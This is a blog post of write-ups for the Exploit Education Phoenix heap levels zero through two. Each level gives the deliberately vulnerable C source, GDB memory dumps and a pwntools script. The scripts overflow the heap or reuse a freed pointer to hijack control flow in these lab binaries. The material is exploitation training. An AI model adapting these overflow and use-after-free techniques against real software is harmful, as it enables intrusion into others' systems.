---
layout: post
title:  "Phoenix Heap"
date:   2021-02-22 00:00:00 +0000
categories: ExploitEducation
---
# Heap Zero
## Description
Link [https://exploit.education/phoenix/heap-zero/](https://exploit.education/phoenix/heap-zero/)
```c
/*
 * phoenix/heap-zero, by https://exploit.education
 *
 * Can you hijack flow control, and execute the winner function?
 *
 * Why do C programmers make good Buddhists?
 * Because they're not object orientated.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

struct data {
  char name[64];
};

struct fp {
  void (*fp)();
  char __pad[64 - sizeof(unsigned long)];
};

void winner() {
  printf("Congratulations, you have passed this level\n");
}

void nowinner() {
  printf(
      "level has not been passed - function pointer has not been "
      "overwritten\n");
}

int main(int argc, char **argv) {
  struct data *d;
  struct fp *f;

  printf("%s\n", BANNER);

  if (argc < 2) {
    printf("Please specify an argument to copy :-)\n");
    exit(1);
  }

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  strcpy(d->name, argv[1]);

  printf("data is at %p, fp is at %p, will be calling %p\n", d, f, f->fp);
  fflush(stdout);

  f->fp();

  return 0;
}
```
## Analyse
1. The `malloc` allocate a piece of memory on the heap. And the allocated memory is next to the previous one. 
2. The `strcpy` function can copy a string without the checking the string length. When we copy a unknow length string, it can cause memory overflow.
3. Here, the objects `d` and `f` are created next to each other and `d` is before `f`. From GDB debuging, we can see there are 0x50 bytes between `d` and `f` objects. So we need to write 80 char to reach `f` object, then write 0x400abd (`winner` function) to overwrite 0x400ace.
    ```
    (gdb) x/gx $rbp-0x8
    0x7fffffffe618: 0x00007ffff7ef6010
    (gdb) x/gx $rbp-0x10
    0x7fffffffe610: 0x00007ffff7ef6060
    (gdb) x/20gx 0x00007ffff7ef6010
    0x7ffff7ef6010: 0x0000000000000000      0x0000000000000000   -> 0x7ffff7ef6010 is `d`
    0x7ffff7ef6020: 0x0000000000000000      0x0000000000000000
    0x7ffff7ef6030: 0x0000000000000000      0x0000000000000000
    0x7ffff7ef6040: 0x0000000000000000      0x0000000000000000
    0x7ffff7ef6050: 0x0000000000000000      0x0000000000000051
    0x7ffff7ef6060: 0x0000000000400ace      0x0000000000000000   -> 0x7ffff7ef6060 is `f`, 0x400ace is nowinner()
    ```

## Solution
```python
from pwn import *

payload = "A" * 80 + "\xbd\x0a\x40"
p = process(["/opt/phoenix/amd64/heap-zero", payload])
p.interactive()
```

# Heap One
## Description
Link [https://exploit.education/phoenix/heap-one/](https://exploit.education/phoenix/heap-one/)
```c
/*
 * phoenix/heap-zero, by https://exploit.education
 *
 * Can you hijack flow control?
 *
 * Which vegetable did Noah leave off the Ark?
 * Leeks
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

struct heapStructure {
  int priority;
  char *name;
};

int main(int argc, char **argv) {
  struct heapStructure *i1, *i2;

  i1 = malloc(sizeof(struct heapStructure));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct heapStructure));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}

void winner() {
  printf(
      "Congratulations, you've completed this level @ %ld seconds past the "
      "Epoch\n",
      time(NULL));
}
```

## Analyse
1. On the stack, we have the i1 and i2's pointers:
    ```
    | High addr -> Low addr |
    | ret | ... | i1 | i2 |
    ```
    And on the heap, we have this:
    ```
    | Low addr -> High addr |
    | i1->priority | i1->name ptr | i1->name | i2->priority | i2->name ptr | i2->name |
    ```
2. The trick is that with the first `strcpy` we can overwrite the `i2->name ptr` to the `ret` address, then the second `strcpy` can replace replace it.
    ```
    (gdb) x/gx $rbp-0x8
    0x7fffffffe668: 0x00007ffff7ef6010
    (gdb) x/gx $rbp-0x10
    0x7fffffffe660: 0x00007ffff7ef6050
    (gdb) x/20gx 0x00007ffff7ef6010
    0x7ffff7ef6010: 0x0000000000000001      0x00007ffff7ef6030
    0x7ffff7ef6020: 0x0000000000000000      0x0000000000000021
    0x7ffff7ef6030: 0x0000000000000000      0x0000000000000000 -> i1->name start from 0x7ffff7ef6030
    0x7ffff7ef6040: 0x0000000000000000      0x0000000000000021
    0x7ffff7ef6050: 0x0000000000000002      0x00007ffff7ef6070 -> should overwrite 0x00007ffff7ef6070 to ret addr 0x00007fffffffe678
    0x7ffff7ef6060: 0x0000000000000000      0x0000000000000021
    0x7ffff7ef6070: 0x0000000000000000      0x0000000000000000
    0x7ffff7ef6080: 0x0000000000000000      0x00000000000fff81
    ``` 
    and in the second payload write bytes "0x400af3" 
3. Compose the payload
    ```python
    payload1 = "A" * 40 + p64(0x00007fffffffe678)
    payload2 = p64(0x00400af3)
    ```
    __BUT__ it is not possible to pass payload2 as argument2... We need to use this expoit to i486 version
4. Re-analyse for i486 version
    ```
    (gdb) x/x $ebp-0xc
    0xffffd70c:     0xf7e69008
    (gdb) x/x $ebp-0x10
    0xffffd708:     0xf7e69028
    (gdb) x/20x 0xf7e69008
    0xf7e69008:     0x00000001      0xf7e69018      0x00000000      0x00000011
    0xf7e69018:     0x74736574      0x00000000      0x00000000      0x00000011
    0xf7e69028:     0x00000002      0xf7e69038      0x00000000      0x00000011
    0xf7e69038:     0x74736574      0x00000000      0x00000000      0x000fffc1
    0xf7e69048:     0x00000000      0x00000000      0x00000000      0x00000000
    (gdb) x/2x $ebp
    0xffffd718:     0xffffd7b4      0xf7f8f654
    (gdb) p winner
    $1 = {<text variable, no debug info>} 0x804889a <winner>
    ```
    payload:
    ```python
    payload1 = "A" * 20 + p32(0xffffd71c)
    payload2 = p32(0x804889a)
    ```

## Solution
```python
from pwn import *

payload1 = "A" * 20 + p32(0xffffd71c)
payload2 = p32(0x804889a)

p = process(["/opt/phoenix/i486/heap-one", payload1, payload2])
p.interactive()
```

# Heap Two
## Description
Link [https://exploit.education/phoenix/heap-two/](https://exploit.education/phoenix/heap-two/)
```c
/*
 * phoenix/heap-two, by https://exploit.education
 *
 * This level examines what can happen when heap pointers are stale. This level
 * is completed when you see the "you have logged in already!" message.
 *
 * My dog would, without fail, always chase people on a bike. As soon as he saw
 * someone, he would immediately take off. I spoke to the vet to see if they
 * could be of any help, but they weren't. I spoke to several different dog
 * behaviouralists to see if they have any ideas on how to stop getting him
 * chasing people on a bike. The dog behaviouralists were unable to help. I
 * searched high and low to work out ways to find a way to stop him from
 * chasing people on a bike, to no avail. Eventually, I had no choice but to
 * take the bike away from him.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv) {
  char line[128];

  printf("%s\n", BANNER);

  while (1) {
    printf("[ auth = %p, service = %p ]\n", auth, service);

    if (fgets(line, sizeof(line), stdin) == NULL) break;

    if (strncmp(line, "auth ", 5) == 0) {
      auth = malloc(sizeof(struct auth));
      memset(auth, 0, sizeof(struct auth));
      if (strlen(line + 5) < 31) {
        strcpy(auth->name, line + 5);
      }
    }
    if (strncmp(line, "reset", 5) == 0) {
      free(auth);
    }
    if (strncmp(line, "service", 6) == 0) {
      service = strdup(line + 7);
    }
    if (strncmp(line, "login", 5) == 0) {
      if (auth && auth->auth) {
        printf("you have logged in already!\n");
      } else {
        printf("please enter your password\n");
      }
    }
  }
}
```

## Analyse
1. The pair of operation `malloc` and `free` work for heap data. `malloc` allocate memory for creating new object, `free` returns the memory to system which makes this memory can be `malloc` again. But `free` does not reset the value of this memory to 0, so it can cause value staling.

## Solution
```
[ auth = 0, service = 0 ]
auth testme
[ auth = 0x600e40, service = 0 ]
reset
[ auth = 0x600e40, service = 0 ]
login
please enter your password
[ auth = 0x600e40, service = 0 ]
serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[ auth = 0x600e40, service = 0x600e40 ]
login
you have logged in already!
[ auth = 0x600e40, service = 0x600e40 ]
```

## Reflection
1. Should always to reset value when malloc some memory.